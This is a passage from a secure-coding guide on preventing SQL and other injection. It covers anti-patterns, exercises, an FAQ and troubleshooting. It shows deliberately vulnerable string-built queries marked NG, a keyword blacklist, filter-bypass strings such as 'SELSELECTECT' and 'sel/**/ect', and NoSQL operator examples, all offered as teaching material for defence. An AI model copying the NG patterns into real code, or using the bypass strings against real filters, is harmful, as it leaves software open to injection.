2. All SQL operations must be parameterized
3. Input validation (Pydantic models)
4. Error messages must not include DB information
5. Escape LIKE wildcards in search functionality
6. Pagination (set upper limits for limit/offset)
7. Proper SQL log management (do not output query content in production)

Verification:
- Confirm no vulnerabilities when tested with sqlmap
```

---

## Anti-patterns

### Anti-pattern 1: Filtering with a Blacklist

An approach that filters dangerous keywords like `SELECT` and `DROP`. There are countless bypass techniques (mixed case, encoding, comment insertion, etc.) and it does not constitute a fundamental countermeasure. Parameterized queries are the only correct solution.

```python
# NG: Blacklist approach
BLACKLIST = ["SELECT", "DROP", "DELETE", "UNION", "INSERT", "--", ";"]

def sanitize_input_bad(value):
    for keyword in BLACKLIST:
        value = value.replace(keyword, "")
    return value
# Bypass: "SELSELECTECT" → "SELECT" (restored after removal)
# Bypass: "sel/**/ect" → does not match the blacklist

# OK: Parameterized query
def query_safe(value):
    return db.execute("SELECT * FROM users WHERE name = ?", (value,))
```

### Anti-pattern 2: Validation on the Client Side Only

A pattern where input validation is only performed in front-end JavaScript. Attackers can send requests directly to the API without going through the browser, so always validate on the server side.

```python
# NG: Client-side only
# JavaScript: if (input.includes("'")) { alert("Invalid character"); }
# → Useless if the API is called directly with curl

# OK: Always validate on the server side
from pydantic import BaseModel, validator

class SearchInput(BaseModel):
    keyword: str

    @validator("keyword")
    def validate_keyword(cls, v):
        if len(v) > 100:
            raise ValueError("Keyword too long")
        if not v.isalnum() and not v.replace(" ", "").isalnum():
            raise ValueError("Invalid characters")
        return v
```

### Anti-pattern 3: Excessive Exposure of Error Messages

```python
# NG: Return SQL errors directly to the user
@app.route("/search")
def search():
    try:
        result = db.execute(f"SELECT * FROM users WHERE id={request.args['id']}")
    except Exception as e:
        return f"Error: {str(e)}", 500
    # → Messages like "Error: near "OR": syntax error"
    #   give attackers hints about the DB type and query structure

# OK: Generic error message + internal log
@app.route("/search")
def search():
    try:
        result = db.execute("SELECT * FROM users WHERE id=?",
                           (request.args['id'],))
    except Exception as e:
        logger.error(f"Database error: {e}")  # Details only in internal log
        return {"error": "Failed to process the request"}, 500
```


---

## Practical Exercises

### Exercise 1: Basic Implementation

Implement code that satisfies the following requirements.

**Requirements:**
- Validate input data
- Implement proper error handling
- Also write test code

```python
# Exercise 1: Template for basic implementation
class Exercise1:
    """Exercise for basic implementation patterns"""

    def __init__(self):
        self.data = []

    def validate_input(self, value):
        """Validate input value"""
        if value is None:
            raise ValueError("Input value is None")
        return True

    def process(self, value):
        """Main logic for data processing"""
        self.validate_input(value)
        self.data.append(value)
        return self.data

    def get_results(self):
        """Retrieve processing results"""
        return {
            'count': len(self.data),
            'data': self.data
        }

# Tests
def test_exercise1():
    ex = Exercise1()
    assert ex.process(1) == [1]
    assert ex.process(2) == [1, 2]
    assert ex.get_results()['count'] == 2

    try:
        ex.process(None)
        assert False, "Exception should have been raised"
    except ValueError:
        pass

    print("All tests passed!")

test_exercise1()
```

### Exercise 2: Applied Pattern

Extend the basic implementation to add the following features.

```python
# Exercise 2: Applied pattern
from typing import List, Dict, Optional
from datetime import datetime

class AdvancedExercise:
    """Exercise for applied patterns"""

    def __init__(self, max_size: int = 100):
        self._items: List[Dict] = []
        self._max_size = max_size
        self._created_at = datetime.now()

    def add(self, key: str, value: any) -> bool:
        """Add an item (with size limit)"""
        if len(self._items) >= self._max_size:
            return False
        self._items.append({
            'key': key,
            'value': value,
            'timestamp': datetime.now().isoformat()
        })
        return True

    def find(self, key: str) -> Optional[Dict]:
        """Search by key"""
        for item in reversed(self._items):
            if item['key'] == key:
                return item
        return None

    def remove(self, key: str) -> bool:
        """Delete by key"""
        for i, item in enumerate(self._items):
            if item['key'] == key:
                self._items.pop(i)
                return True
        return False

    def stats(self) -> Dict:
        """Statistics"""
        return {
            'total_items': len(self._items),
            'max_size': self._max_size,
            'usage_percent': len(self._items) / self._max_size * 100,
            'uptime': str(datetime.now() - self._created_at)
        }

# Tests
def test_advanced():
    ex = AdvancedExercise(max_size=3)
    assert ex.add("a", 1) == True
    assert ex.add("b", 2) == True
    assert ex.add("c", 3) == True
    assert ex.add("d", 4) == False  # Size limit
    assert ex.find("b")['value'] == 2
    assert ex.remove("b") == True
    assert ex.find("b") is None
    stats = ex.stats()
    assert stats['total_items'] == 2
    print("All advanced tests passed!")

test_advanced()
```

### Exercise 3: Performance Optimization

Improve the performance of the following code.

```python
# Exercise 3: Performance optimization
import time
from functools import lru_cache

# Before optimization (O(n^2))
def slow_search(data: list, target: int) -> int:
    """Inefficient search"""
    for i in range(len(data)):
        for j in range(i + 1, len(data)):
            if data[i] + data[j] == target:
                return (i, j)
    return (-1, -1)

# After optimization (O(n))
def fast_search(data: list, target: int) -> tuple:
    """Efficient search using a hash map"""
    seen = {}
    for i, num in enumerate(data):
        complement = target - num
        if complement in seen:
            return (seen[complement], i)
        seen[num] = i
    return (-1, -1)

# Benchmark
def benchmark():
    import random
    data = list(range(5000))
    random.shuffle(data)
    target = data[100] + data[4000]

    start = time.time()
    result1 = slow_search(data, target)
    slow_time = time.time() - start

    start = time.time()
    result2 = fast_search(data, target)
    fast_time = time.time() - start

    print(f"Slow version: {slow_time:.4f}s")
    print(f"Fast version: {fast_time:.6f}s")
    print(f"Speedup: {slow_time/fast_time:.0f}x")

benchmark()
```

**Key points:**
- Be aware of algorithm time complexity
- Choose appropriate data structures
- Measure the effect with benchmarks
---

## FAQ

### Q1: If I use an ORM, can SQL injection be completely prevented?

Almost, but not completely. Even with an ORM, SQL injection can occur when writing raw SQL via `raw()` or `execute()`, or when building queries by string concatenation. Specific ORM versions may also have vulnerabilities. Even when using an ORM, always use parameter binding when writing raw SQL.

### Q2: Can WAF alone prevent injection?

WAF alone is insufficient. WAF uses signature-based detection and may not handle advanced bypass techniques. WAF should be treated as a supplementary defense layer and used in combination with root-cause countermeasures like parameterized queries. WAF false positives (false positives) also risk blocking legitimate requests.

### Q3: Are prepared statements and parameterized queries the same thing?

Conceptually they are almost the same, but strictly speaking they differ. Prepared statements include a mechanism for caching the query plan on the DB side, while parameterized queries refer to the technique of separating data from code. Both are effective as injection defenses. Some libraries offer "emulated prepared statements" that escape on the client side, but true prepared statements (server-side) provide higher security.

### Q4: Can NoSQL databases also be subject to injection?

Yes. Representative examples include MongoDB operator injection (`$ne`, `$gt`, etc.) and JavaScript injection via the `$where` clause. Since NoSQL is schema-less, type checking becomes especially important. Strictly validate that input is a string and reject object types (which may contain operators) as the basic countermeasure.

### Q5: How do I defend against template injection (SSTI)?

The most important countermeasure is not to concatenate user input as part of the template string. Fix the template and pass input as a variable. If dynamic templates are unavoidable, use SandboxedEnvironment to restrict access to dangerous attributes and methods.

### Q6: Can ORDER BY and LIMIT clauses be parameterized?

In most DB drivers, column names and sort direction (ASC/DESC) in ORDER BY cannot be parameterized, because they are part of the SQL structure, not data. The countermeasure is to validate allowed column names with a whitelist, confirm they are safe values, and then use string concatenation. LIMIT/OFFSET can often be parameterized after validating them as numeric types.

---

## Troubleshooting

### Using IN clause with parameterized queries

```python
# NG: Build IN clause with string concatenation
ids = [1, 2, 3]
query = f"SELECT * FROM users WHERE id IN ({','.join(map(str, ids))})"

# OK: Dynamically generate placeholders
ids = [1, 2, 3]
placeholders = ','.join(['?'] * len(ids))
query = f"SELECT * FROM users WHERE id IN ({placeholders})"
result = db.execute(query, ids)

# OK: SQLAlchemy
from sqlalchemy import select
stmt = select(User).where(User.id.in_([1, 2, 3]))
```

### Specifying column names dynamically

```python
# NG: Embed column name directly
column = request.args["sort_by"]
query = f"SELECT * FROM users ORDER BY {column}"

# OK: Validate with whitelist
ALLOWED_SORT_COLUMNS = {"username", "email", "created_at"}

column = request.args["sort_by"]
if column not in ALLOWED_SORT_COLUMNS:
    column = "created_at"  # Default value
query = f"SELECT * FROM users ORDER BY {column}"
```

---

## Summary

| Defense technique | Target | Effect | Recommendation |
|------------------|--------|--------|----------------|
| Parameterized queries | SQL/NoSQL | Complete separation of data and code | Required |
| ORM | SQL | Abstraction of safe query building | Recommended |
| Input validation | All | Early rejection of invalid input | Required |
| shell=False list execution | Command | Avoid shell interpretation | Required |
| Escaping | LDAP/XPath | Neutralize special characters | Required |
| Template variable separation | SSTI | Separate code and data | Required |
| WAF | All | Block known patterns | Supplementary |
| DB least privilege | SQL | Minimize damage | Recommended |
| Error message control | All | Prevent information leakage | Required |

---

## Next Guides to Read

- [04-auth-vulnerabilities.md](./04-auth-vulnerabilities.md) -- Authentication vulnerabilities and session management
- [01-xss-prevention.md](./01-xss-prevention.md) -- XSS (HTML injection) in detail
- [../04-application-security/00-secure-coding.md](../04-application-security/00-secure-coding.md) -- Secure coding in general
- [../02-cryptography/01-tls-certificates.md](../02-cryptography/01-tls-certificates.md) -- Communication protection via encryption

---

## References

1. OWASP Injection Prevention Cheat Sheet -- https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html
2. OWASP SQL Injection Prevention Cheat Sheet -- https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
3. PortSwigger Web Security Academy: SQL Injection -- https://portswigger.net/web-security/sql-injection
4. CWE-89: Improper Neutralization of Special Elements used in an SQL Command -- https://cwe.mitre.org/data/definitions/89.html
5. CWE-78: OS Command Injection -- https://cwe.mitre.org/data/definitions/78.html
6. CWE-90: LDAP Injection -- https://cwe.mitre.org/data/definitions/90.html
7. CWE-1336: Server-Side Template Injection -- https://cwe.mitre.org/data/definitions/1336.html
8. MongoDB Security Checklist -- https://www.mongodb.com/docs/manual/administration/security-checklist/
9. OWASP Testing Guide: SQL Injection -- https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
